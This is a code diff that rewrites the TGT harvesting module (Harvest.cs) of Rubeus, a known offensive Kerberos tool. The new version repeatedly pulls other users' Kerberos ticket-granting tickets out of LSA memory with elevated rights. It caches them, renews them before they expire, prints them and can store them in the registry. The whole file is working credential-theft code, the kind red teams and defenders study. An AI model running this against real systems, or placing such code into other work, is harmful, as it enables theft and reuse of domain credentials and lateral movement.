@@ -1,225 +1,189 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Diagnostics.Eventing.Reader;
-using System.Runtime.InteropServices;
-using System.Text.RegularExpressions;
 using System.Threading;
+using Rubeus.lib.Interop;
 
 namespace Rubeus
 {
     public class Harvest
     {
-        public static void HarvestTGTs(int intervalMinutes, string registryBasePath)
-        {
-            // First extract all TGTs then monitor the event log (indefinitely) for 4624 logon events
-            //  every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log.
-            // On each interval, renew any tickets that are about to expire and refresh the cache.
-            // End result: every "intervalMinutes" a set of currently valid TGT .kirbi files are dumped to console
+        private readonly List<KRB_CRED> harvesterTicketCache = new List<KRB_CRED>();
+        private readonly int monitorIntervalSeconds;
+        private readonly int displayIntervalSeconds;
+        private readonly string targetUser;
+        private readonly bool renewTickets;
+        private readonly string registryBasePath;
+        private readonly bool nowrap;
+        private DateTime lastDisplay;
 
+        public Harvest(int monitorIntervalSeconds, int displayIntervalSeconds, bool renewTickets, string targetUser, string registryBasePath, bool nowrap)
+        {
+            this.monitorIntervalSeconds = monitorIntervalSeconds;
+            this.displayIntervalSeconds = displayIntervalSeconds;
+            this.renewTickets = renewTickets;
+            this.targetUser = targetUser;
+            this.registryBasePath = registryBasePath;
+            this.lastDisplay = DateTime.Now;
+            this.nowrap = nowrap;
+        }
+
+        public void HarvestTicketGrantingTickets()
+        {
             if (!Helpers.IsHighIntegrity())
             {
                 Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                 return;
             }
-
-            Console.WriteLine("[*] Action: TGT Harvesting (w/ auto-renewal)");
-            Console.WriteLine("\r\n[*] Monitoring every {0} minutes for 4624 logon events\r\n", intervalMinutes);
-
-            // used to keep track of LUIDs we've already dumped
-            var seenLUIDs = new Dictionary<ulong, bool>();
 
             // get the current set of TGTs
-            List<KRB_CRED> creds = LSA.ExtractTGTs(new Interop.LUID());
-
             while (true)
             {
-                // check for 4624 logon events in the past "intervalSeconds"
-                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalMinutes * 60 * 1000);
-                EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
-                EventLogReader logReader = new EventLogReader(eventsQuery);
-
-                for (EventRecord eventInstance = logReader.ReadEvent(); eventInstance != null; eventInstance = logReader.ReadEvent())
+                // extract out the TGTs (service = krbtgt_ w/ full data, silent enumeration
+                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, new LUID(), "krbtgt", this.targetUser, null, true, true);
+                List<KRB_CRED> currentTickets = new List<KRB_CRED>();
+                foreach(var sessionCred in sessionCreds)
                 {
-                    // if there's an event, extract out the logon ID (LUID) for the session
-                    string eventMessage = eventInstance.FormatDescription();
-                    DateTime eventTime = (DateTime)eventInstance.TimeCreated;
-
-                    int startIndex = eventMessage.IndexOf("New Logon:");
-                    string message = eventMessage.Substring(startIndex);
-
-                    // extract out relevant information from the event log message
-                    var acctNameExpression = new Regex(string.Format(@"\n.*Account Name:\s*(?<name>.+?)\r\n"));
-                    Match acctNameMatch = acctNameExpression.Match(message);
-                    var acctDomainExpression = new Regex(string.Format(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n"));
-                    Match acctDomainMatch = acctDomainExpression.Match(message);
-
-                    if (acctNameMatch.Success)
+                    foreach(var ticket in sessionCred.Tickets)
                     {
-                        var srcNetworkExpression = new Regex(string.Format(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n"));
-                        Match srcNetworkMatch = srcNetworkExpression.Match(message);
-
-                        string logonName = acctNameMatch.Groups["name"].Value;
-                        string accountDomain = "";
-                        string srcNetworkAddress = "";
-                        try
-                        {
-                            accountDomain = acctDomainMatch.Groups["domain"].Value;
-                        }
-                        catch { }
-                        try
-                        {
-                            srcNetworkAddress = srcNetworkMatch.Groups["address"].Value;
-                        }
-                        catch { }
-
-                        // ignore SYSTEM logons and other defaults
-                        if (!Regex.IsMatch(logonName, @"SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON", RegexOptions.IgnoreCase))
-                        {
-                            Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, accountDomain, logonName, srcNetworkAddress);
-
-                            var expression2 = new Regex(string.Format(@"\n.*Logon ID:\s*(?<id>.+?)\r\n"));
-                            Match match2 = expression2.Match(message);
-
-                            if (match2.Success)
-                            {
-                                try
-                                {
-                                    // check if we've seen this LUID before
-                                    Interop.LUID luid = new Interop.LUID(match2.Groups["id"].Value);
-                                    if (!seenLUIDs.ContainsKey((ulong)luid))
-                                    {
-                                        seenLUIDs[luid] = true;
-                                        // if we haven't seen it, extract any TGTs for that particular logon ID and add to the cache
-                                        List<KRB_CRED> newCreds = LSA.ExtractTGTs(luid);
-                                        creds.AddRange(newCreds);
-                                    }
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine("[X] Exception: {0}", e.Message);
-                                }
-                            }
-                        }
+                        currentTickets.Add(ticket.KrbCred);
                     }
                 }
 
-                for (int i = creds.Count - 1; i >= 0; i--)
-                {
-                    DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(creds[i].enc_part.ticket_info[0].endtime);
-                    DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(creds[i].enc_part.ticket_info[0].renew_till);
+                if (renewTickets) {
+                    // "harvest" mode - so don't display new tickets as they come in
+                    AddTicketsToTicketCache(currentTickets, false);
 
-                    // check if the ticket is going to expire before the next interval checkin
-                    if (endTime < DateTime.Now.AddMinutes(intervalMinutes))
+                    // check if we're at a new display interval
+                    if(lastDisplay.AddSeconds(this.displayIntervalSeconds) < DateTime.Now.AddSeconds(1))
                     {
-                        // check if the ticket's renewal limit will be valid within the next interval
-                        if (renewTill < DateTime.Now.AddMinutes(intervalMinutes))
-                        {
-                            // renewal limit under checkin interval, so remove the ticket from the cache
-                            creds.RemoveAt(i);
-                        }
-                        else
-                        {
-                            // renewal limit after checkin interval, so renew the TGT
-                            string userName = creds[i].enc_part.ticket_info[0].pname.name_string[0];
-                            string domainName = creds[i].enc_part.ticket_info[0].prealm;
-
-                            Console.WriteLine("[*] Renewing TGT for {0}@{1}", userName, domainName);
-                            byte[] bytes = Renew.TGT(creds[i], null, false, "", false);
-                            KRB_CRED renewedCred = new KRB_CRED(bytes);
-                            creds[i] = renewedCred;
-                        }
+                        this.lastDisplay = DateTime.Now;
+                        // refresh/renew everything in the cache and display the working set
+                        RefreshTicketCache(true);
+                        Console.WriteLine("[*] Sleeping until {0} ({1} seconds) for next display\r\n", DateTime.Now.AddSeconds(displayIntervalSeconds), displayIntervalSeconds);
+                    }
+                    else
+                    {
+                        // refresh/renew everything in the cache, but don't display the working set
+                        RefreshTicketCache();
                     }
                 }
+                else
+                {
+                    // "monitor" mode - display new ticketson harvest
+                    AddTicketsToTicketCache(currentTickets, true);
+                }
 
-                Console.WriteLine("\r\n[*] {0} - Current usable TGTs:\r\n", DateTime.Now);
-                LSA.DisplayTGTs(creds);
                 if (registryBasePath != null)
                 {
-                    LSA.SaveTicketsToRegistry(creds, registryBasePath);
+                    LSA.SaveTicketsToRegistry(harvesterTicketCache, registryBasePath);
                 }
 
-                Thread.Sleep(intervalMinutes * 60 * 1000);
+                Thread.Sleep(monitorIntervalSeconds * 1000);
             }
         }
 
-        public static void Monitor4624(int intervalSeconds, string targetUser, string registryBasePath = null)
+        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool displayNewTickets)
         {
-            // monitors the event log (indefinitely) for 4624 logon events every 'intervalSeconds' and dumps TGTs JUST for the specific
-            //  logon IDs (LUIDs) based on the event log. Can optionally only extract for a targeted user.
+            // adds a list of KRB_CREDs to the internal cache
+            //  displayNewTickets - display new TGTs as they're added, e.g. "monitor" mode
 
-            if (!Helpers.IsHighIntegrity())
+            bool newTicketsAdded = false;
+
+            if (tickets == null)
+                throw new ArgumentNullException(nameof(tickets));
+
+            foreach (var ticket in tickets)
             {
-                Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
-                return;
-            }
+                var newTgtBytes = Convert.ToBase64String(ticket.RawBytes);
 
-            // used to keep track of LUIDs we've already dumped
-            var seenLUIDs = new Dictionary<ulong, bool>();
+                var ticketInCache = false;
 
-            Console.WriteLine("[*] Action: TGT Monitoring");
-            Console.WriteLine("[*] Monitoring every {0} seconds for 4624 logon events", intervalSeconds);
-
-            if (!String.IsNullOrEmpty(targetUser))
-            {
-                Console.WriteLine("[*] Target user : {0}", targetUser);
-            }
-            Console.WriteLine();
-
-
-            while (true)
-            {
-                // check for 4624 logon events in the past "intervalSeconds"
-                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]] and *[EventData[Data[@Name='AuthenticationPackageName']='Kerberos']]", (intervalSeconds+3) * 1000);
-                EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
-                EventLogReader logReader = new EventLogReader(eventsQuery);
-
-                for (EventRecord eventInstance = logReader.ReadEvent(); eventInstance != null; eventInstance = logReader.ReadEvent())
+                foreach (var cachedTicket in harvesterTicketCache)
                 {
-                    // if there's an event, extract out the logon ID (LUID) for the session
-                    string eventMessage = eventInstance.FormatDescription();
-                    DateTime eventTime = (DateTime)eventInstance.TimeCreated;
-
-                    
-                    string targetUserName = eventInstance.Properties[5].Value.ToString();
-                    string targetUserDomain = eventInstance.Properties[6].Value.ToString();
-                    string targetLogonId = eventInstance.Properties[7].Value.ToString();
-                    string srcNetworkAddress = eventInstance.Properties[18].Value.ToString();
-
-                    // ignore SYSTEM logons and other defaults
-                    if (Regex.IsMatch(targetUserName,
-                        @"^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON)$",
-                        RegexOptions.IgnoreCase))
+                    // check the base64 of the raw ticket bytes to see if we've seen it before
+                    if (Convert.ToBase64String(cachedTicket.RawBytes) == newTgtBytes)
                     {
-                        continue;
-                    }
-
-                    Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, targetUserDomain, targetUserName, srcNetworkAddress);
-                    // filter if we're targeting a specific user
-                    if (targetUser != null && !Regex.IsMatch(targetUserName, Regex.Escape(targetUser), RegexOptions.IgnoreCase))
-                    {
-                        continue;
-                    }
-
-                    try
-                    {
-                        // check if we've seen this LUID before
-                        Interop.LUID luid = new Interop.LUID(targetLogonId);
-                        if (!seenLUIDs.ContainsKey((ulong)luid))
-                        {
-                            seenLUIDs[luid] = true;
-                            // if we haven't seen it, extract any TGTs for that particular logon ID
-                            LSA.ListKerberosTicketData(luid, "krbtgt", true, registryBasePath);
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("[X] Exception: {0}", e.Message);
+                        ticketInCache = true;
+                        break;
                     }
                 }
 
-                Thread.Sleep(intervalSeconds * 1000);
+                if (ticketInCache)
+                    continue;
+
+                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(ticket.enc_part.ticket_info[0].endtime);
+
+                if (endTime < DateTime.Now)
+                {
+                    // skip if the ticket is expired
+                    continue;
+                }
+
+                harvesterTicketCache.Add(ticket);
+                newTicketsAdded = true;
+
+                if (displayNewTickets)
+                {
+                    Console.WriteLine($"\r\n[*] {DateTime.Now.ToUniversalTime()} UTC - Found new TGT:\r\n");
+                    LSA.DisplayTicket(ticket, 2, true, true, false, this.nowrap);
+                }
             }
+
+            if(displayNewTickets && newTicketsAdded)
+                Console.WriteLine("[*] Ticket cache size: {0}\r\n", harvesterTicketCache.Count);
         }
+
+        private void RefreshTicketCache(bool display = false)
+        {
+            // goes through each ticket in the cache, removes any tickets that have expired
+            //  and renews any tickets that are going to expire before the next check interval
+            //  then displays the current "active" ticket cache if "display" is passed as true
+
+            if (display)
+                Console.WriteLine("\r\n[*] Refreshing TGT ticket cache ({0})\r\n", DateTime.Now);
+
+            for (var i = harvesterTicketCache.Count - 1; i >= 0; i--)
+            {
+                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].endtime);
+                var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].renew_till);
+                var userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];
+                var domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;
+
+                // check if the ticket has now expired
+                if (endTime < DateTime.Now)
+                {
+                    Console.WriteLine("[!] Removing TGT for {0}@{1}\r\n", userName, domainName);
+                    // remove the ticket from the cache
+                    Console.WriteLine("harvesterTicketCache count: {0}", harvesterTicketCache.Count);
+                    harvesterTicketCache.RemoveAt(i);
+                    Console.WriteLine("harvesterTicketCache count: {0}", harvesterTicketCache.Count);
+                }
+
+                else
+                {
+                    // check if the ticket is going to expire before the next interval checkin
+                    //  but we'll still be in the renew window
+                    if ( (endTime < DateTime.Now.AddSeconds(monitorIntervalSeconds)) && (renewTill > DateTime.Now.AddSeconds(monitorIntervalSeconds)) )
+                    {
+                        // renewal limit after checkin interval, so renew the TGT
+                        userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];
+                        domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;
+
+                        Console.WriteLine("[*] Renewing TGT for {0}@{1}\r\n", userName, domainName);
+                        var bytes = Renew.TGT(harvesterTicketCache[i], "", false, "", false);
+                        var renewedCred = new KRB_CRED(bytes);
+                        harvesterTicketCache[i] = renewedCred;
+                    }
+
+                    if (display)
+                        LSA.DisplayTicket(harvesterTicketCache[i], 2, true, true, false, this.nowrap);
+                }
+
+            }
+
+            if (display)
+                Console.WriteLine("[*] Ticket cache size: {0}", harvesterTicketCache.Count);
+        }
+
     }
 }
